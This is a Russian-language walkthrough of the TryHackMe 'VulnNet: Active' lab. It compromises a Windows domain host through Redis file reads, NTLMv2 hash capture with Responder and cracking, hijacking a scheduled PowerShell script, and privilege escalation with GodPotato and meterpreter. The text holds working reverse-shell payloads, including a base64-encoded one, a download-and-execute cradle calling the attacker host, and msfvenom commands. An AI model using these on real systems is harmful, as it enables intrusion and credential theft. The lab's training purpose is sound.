# TrayHackMe - writeup Отчёт по VulnNet: Active

Первоначально был предоставлен IP-адрес, поэтому первым делом необходимо просканировать хост для сбора информации:
```bash
$ rustscan -a <target_ip> -- -sV --version-all --script=vuln -Pn -A
...
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
6379/tcp  open  redis         syn-ack ttl 126 Redis key-value store 2.8.2402
| vulners: 
|   cpe:/a:redislabs:redis:2.8.2402: 
|       CVE-2018-11219  9.8     https://vulners.com/cve/CVE-2018-11219
|       CVE-2018-11218  9.8     https://vulners.com/cve/CVE-2018-11218
|       EDB-ID:44904    8.4     https://vulners.com/exploitdb/EDB-ID:44904      *EXPLOIT*
|       CVE-2018-12326  8.4     https://vulners.com/cve/CVE-2018-12326
|       CVE-2020-14147  7.7     https://vulners.com/cve/CVE-2020-14147
|       EDB-ID:44908    7.5     https://vulners.com/exploitdb/EDB-ID:44908      *EXPLOIT*
|       CVE-2021-32761  7.5     https://vulners.com/cve/CVE-2021-32761
|       CVE-2018-12453  7.5     https://vulners.com/cve/CVE-2018-12453
|       CVE-2016-10517  7.4     https://vulners.com/cve/CVE-2016-10517
|       CVE-2021-3470   5.3     https://vulners.com/cve/CVE-2021-3470
|       EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2    5.0     https://vulners.com/exploitpack/EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2    *EXPLOIT*
|       EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2    4.6     https://vulners.com/exploitpack/EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2    *EXPLOIT*
|       CVE-2013-7458   3.3     https://vulners.com/cve/CVE-2013-7458
|       PACKETSTORM:148270      0.0     https://vulners.com/packetstorm/PACKETSTORM:148270      *EXPLOIT*
|       PACKETSTORM:148225      0.0     https://vulners.com/packetstorm/PACKETSTORM:148225      *EXPLOIT*
|       1337DAY-ID-30603        0.0     https://vulners.com/zdt/1337DAY-ID-30603        *EXPLOIT*
|_      1337DAY-ID-30598        0.0     https://vulners.com/zdt/1337DAY-ID-30598        *EXPLOIT*
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%)
No exact OS matches for host (test conditions non-ideal).
```
Или вы можете использовать инструмент `nmap` для той же цели:
```bash
$ sudo nmap -sS -p- -v -T4 -sC -O <target_ip>
```
Можно отметить важные моменты:
-   это *Microsoft Windows Server 2019*;
-   на хосте открыт *порт 445 (smb)*;
-   на хосте запущена служба *redis* на стандартном порту.

Попытка тестирования анонимного доступа к общей папке SMB не дала достаточных данных: пользователь существует, но не может перечислить ресурсы или получить другую информацию из smb.

Последнее, что можно сделать, — это попробовать взаимодействовать с redis. Возникло несколько идей о способах получения оболочки:
-   найти эксплойт для удаленного выполнения кода (RCE);
-   найти встроенную функциональность для получения оболочки;
-   найти какие-либо учетные данные или что-то ещё в нем.
    
Разведка в redis показала версию 2.8.2402:
```bash
$ redis-cli -h <target_ip>
redis <target_ip>:6379> CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```
Было найдено несколько эксплойтов для удаленного выполнения кода на Redis, но они полезны для версий Redis 4-5, а версия 2.8.2402 слишком стара для этих эксплойтов.

Мы можем создавать файлы с содержимым, но у нас нет возможности их выполнить. Мы также можем загрузить файл в папку автозагрузки, но не можем заставить пользователя выйти из системы и снова войти.

Распространенная техника в доменной среде с базами данных SQL/NoSQL — попытка чтения файла из сетевой папки (атака отравления LLMNR/NBT-NS). Таким образом, мы можем использовать эту технику, чтобы перехватить хэш пароля NTLMv2.

Сначала была найдена команда, позволяющая читать файлы:
```bash
<target_ip>:6379> EVAL 'dofile("C:\\test.txt")' 0
(error) ERR Error running script (call to f_f605751492f1c2a4007748b6dec33c156d36455f): @user_script:1: cannot open C:\test.txt: No such file or directory
```
Команда работает, это показывает попытку доступа к файлу на диске C. Кстати, теперь мы можем прочитать флаг пользователя:
```bash
<target_ip>:6379> EVAL "return dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_0d774ebaa144c4dca9635e3c74cb345ba11b9d52): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
```
Просто оберните его в теги `THM{}`, и всё готово.

Следующий шаг — настройка окружения для отравления запросов и открытия smb-ресурса на атакующей машине:
```bash
sudo responder -I tun0
```
Мы прослушиваем трафик и теперь готовы получить NTLMv2 Response. Итак, всё, что нам нужно, — это открыть любой файл в нашей папке smb-ресурса:
```bash
<target_ip>:6379> EVAL 'dofile("\\<attacker_ip>\hello.txt")' 0
(error) ERR Error running script (call to f_2eae4c5fb68418795e7de5e3a00de3de32323f70): @user_script:1: cannot open \<attacker_ip>hello.txt: No such file or directory
```
Ответ показал, что команда удалила некоторые символы `\`, поэтому исправим команду:
```bash
<target_ip>:6379> EVAL 'dofile("\\\\<attacker_ip>\\hello.txt")' 0
(error) ERR Error running script (call to f_1e2831f77e91ba982742fbfc1d9b377d5363e018): @user_script:1: cannot open \\<attacker_ip>\hello.txt: Permission denied
```
Мы сделали корректный запрос к файлу hello.txt на атакующей машине. Responder перехватил хэш NTLMv2:
```bash
[SMB] NTLMv2-SSP Client   : <target_ip>
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:a48ae7e6a56444ff:99ACD32F7970CD7AE6BB0892EF2E149F:0101000000000000007CEADF4B85DC016A0546F33DFC85B50000000002000800410041005800520001001E00570049004E002D0035004B004300440037004D004B00580050003600460004003400570049004E002D0035004B004300440037004D004B0058005000360046002E0041004100580052002E004C004F00430041004C000300140041004100580052002E004C004F00430041004C000500140041004100580052002E004C004F00430041004C0007000800007CEADF4B85DC0106000400020000000800300030000000000000000000000000300000C4386583A50FF890D4B6830E04574D8E88726CC866959B39E33D49A1816369F10A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100320038002E003100340031000000000000000000 
```
Теперь мы сохраняем `NTLMv2-SSP Hash` в файл `pass.hash`, определяем режим hashcat для офлайн-взлома хэша с помощью `hashcat --identify pass.hash` и используем полученную команду:
```bash
hashcat -a 0 -m 5600 pass.hash /usr/share/wordlists/rockyou.txt
...
ENTERPRISE-SECURITY::VULNNET:a48ae7e6a56444ff:99acd32f7970cd7ae6bb0892ef2e149f:0101000000000000007ceadf4b85dc016a0546f33dfc85b50000000002000800410041005800520001001e00570049004e002d0035004b004300440037004d004b00580050003600460004003400570049004e002d0035004b004300440037004d004b0058005000360046002e0041004100580052002e004c004f00430041004c000300140041004100580052002e004c004f00430041004c000500140041004100580052002e004c004f00430041004c0007000800007ceadf4b85dc0106000400020000000800300030000000000000000000000000300000c4386583a50ff890d4b6830e04574d8e88726cc866959b39e33d49a1816369f10a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320038002e003100340031000000000000000000:sand_0873959498
...
```
Теперь у нас есть учетные данные в открытом виде, чтобы продолжить работу с протоколом SMB. Первое, что нужно сделать, — перечислить нестандартные сетевые ресурсы, доступные для чтения, записи и т.д., а также их разрешения:
```bash
$ nxc smb <target_ip> -u enterprise-security -p sand_0873959498 --shares
SMB         <target_ip>    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         <target_ip>    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
SMB         <target_ip>    445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         <target_ip>    445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         <target_ip>    445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         <target_ip>    445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         <target_ip>    445    VULNNET-BC3TCK1  C$                              Default share
SMB         <target_ip>    445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE
SMB         <target_ip>    445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         <target_ip>    445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share
SMB         <target_ip>    445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
```
Мы получили интересную папку с именем `Enterprise-Share`. Она потенциально может содержать конфиденциальные данные. Чтобы перейти в эту папку, мы можем использовать команду `smbclient //<целевой_ip>/Enterprise-Share -U 'VULNNET\enterprise-security'`. Там находится всего один файл скрипта PowerShell:
```bash
smb: \> ls
  .                                   D        0  Wed Jan 14 15:25:57 2026
  ..                                  D        0  Wed Jan 14 15:25:57 2026
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026
```
Используя команду `more`, мы можем прочитать файл и получить его содержимое:
```bash
rm -Force C:\Users\Public\Documents* -ErrorAction SilentlyContinue
```
Этот файл удаляет все файлы в указанной директории. Возможно, он выполняется по расписанию (scheduled task), потому что нет причин удалять файлы единожды с помощью данного скрипта, в таком случае вводили бы команду вручную в оболочке. Таким образом, скрипт был создан для автоматического периодического выполнения, что обычно делает планировщик задач.

У нас есть разрешения на запись в этой директории, поэтому мы можем удалить этот файл и добавить новый с тем же именем, который даст нам оболочку. Команда `put` может заменить файл в сетевом ресурсе нашим локальным файлом обратной оболочки. По каким-то причинам ни один скрипт обратной оболочки PowerShell не выполнился успешно, поэтому было решено протестировать с помощью простой команды `pwd > \\<целевой_ip>\Enterprise-Share\who.txt`. Через минуту скрипт выполнился, и появился файл `who.txt`. Он также содержал верную информацию о текущем пользователе:
```bash
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.2 kB/s) (average 2.0 kB/s)
smb: \> ls
  .                                   D        0  Wed Feb 24 01:45:41 2021
  ..                                  D        0  Wed Feb 24 01:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026

                9558271 blocks of size 4096. 5139997 blocks available
smb: \> ls
  .                                   D        0  Wed Jan 14 15:25:57 2026
  ..                                  D        0  Wed Jan 14 15:25:57 2026
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026
  who.txt                             A      254  Wed Jan 14 15:26:15 2026
```
Поскольку были использованы 3 различных скрипта PowerShell для установления обратной оболочки, причиной неудач мог быть размер этих файлов (скриптов). Поскольку мы не можем выполнять наши реверс-шеллы напрямую, мы можем написать скрипт, который подключается к нашей машине, загружает содержимое файла и выполняет его в памяти. Нам также необходимо открыть HTTP-сервер на атакующем (нашем) хосте и создать файл обратной оболочки `shell.ps1`, который будет выполнен:
```bash
$ cat PurgeIrrelevantData_1826.ps1
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:<server_port_for_shell_load>/shell.ps1')"

$ cat shell.ps1
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANQAzAC4AMQA0ADAAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<target_ip> - - [14/Jan/2026 15:30:05] "GET /shell.ps1 HTTP/1.1" 200 -
```
Скрипт `shell.ps1` содержит полезную нагрузку, декодированную из base64, которая предоставляет нам обратную оболочку на порту `4444`. Чтобы её поймать, нам необходимо открыть этот порт для прослушивания:
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<attacker_ip>] from (UNKNOWN) [<target_ip>] 49752

PS C:\Users\enterprise-security\Downloads>
```
Как мы видим, мы получили пользовательскую оболочку, загрузив файл в общий ресурс и подождав минуту.

Другой, более простой способ получить обратную оболочку — использовать этот скрипт:
```powershell
$client = New-Object System.Net.Sockets.TcpClient('<attacker_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Если мы используем это содержимое в файле `PurgeIrrelevantData_1826.ps1`, он будет успешно выполнен.

Получив шелл на целевом хосте, мы проводим разведку, чтобы получить информацию о системе, в которой находимся, например, `systeminfo` и `whoami /priv`. Мы получаем информацию, что это `64-битная система`, и у нас включена привилегия `SeImpersonatePrivilege`, которую можно использовать с помощью инструментов типа Potato. Некоторые инструменты Potato не работают, некоторые работают. Один из работающих — `GodPotato`.

Чтобы использовать этот инструмент, нам необходимо, во-первых, скачать файл `GodPotato-NET4.exe` из репозитория `BeichenDream/GodPotato`. Во-вторых, загрузить его на целевой хост с помощью команды `wget http://<ip_атакующего>:<порт_сервера_для_загрузки_эксплойта>/GodPotato-NET4.exe -OutFile C:\Windows\Temp\gp.exe` и, наконец, выполнить бинарник командой `C:\Windows\Temp\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"`. Этот метод сработал, и мы получили флаг `THM{d540c0645975900e5bb9167aa431fc9b}`.

Другой, более сложный способ — получить системную оболочку через `Metasploit framework`. Для этого нужно создать полезную нагрузку для обратной оболочки: `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip_атакующего> lport=8443 -f exe -o reverse_shell.exe`, загрузить файл на целевой хост: `wget http://<ip_атакующего>:<порт_сервера_для_загрузки_reverse_shell>/reverse_shell.exe -OutFile C:\Windows\Temp\reverse_shell.exe`. Теперь необходимо настроить `Metasploit` на ожидание `metasploit shell`:
```bash
msf > use exploit/multi/handler
...
msf exploit(multi/handler) > show options
msf exploit(multi/handler) > set lhost <attacker_ip>
lhost => <attacker_ip>
msf exploit(multi/handler) > set lport <attacker_port>
lport => <attacker_port>
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > run
```
После запуска файла `C:\Windows\Temp\reverse_shell.exe` мы получили пользовательскую оболочку в `Metasploit`:
```bash
[*] Meterpreter session 17 opened (<attacker_ip>:<attacker_port> -> <target_ip>:49927) at 2026-01-14 17:05:31 +0300
```
И довольно просто получили дальнейшую командную оболочку `SYSTEM`:
```bash
meterpreter > getuid
Server username: VULNNET\enterprise-security
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat C:\\Users\\Administrator\\Desktop\\system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
meterpreter > cat C:\\Users\\enterprise-security\\Desktop\\user.txt
THM{3eb176aee96432d5b100bc93580b291e}
```

